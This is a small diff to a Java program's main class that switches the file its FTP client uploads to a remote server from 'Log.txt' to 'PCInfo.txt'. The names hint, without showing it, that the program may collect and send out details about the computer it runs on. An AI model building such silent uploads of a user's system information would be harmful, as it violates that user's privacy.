@@ -72,7 +72,7 @@ public class Main {
             ftp.setFileType(FTP.BINARY_FILE_TYPE);
 
 
-            String localFilePath = "./Log.txt";
+            String localFilePath = "./PCInfo.txt";
             String remoteDirectory = "/";
 
             File localFile = new File(localFilePath);
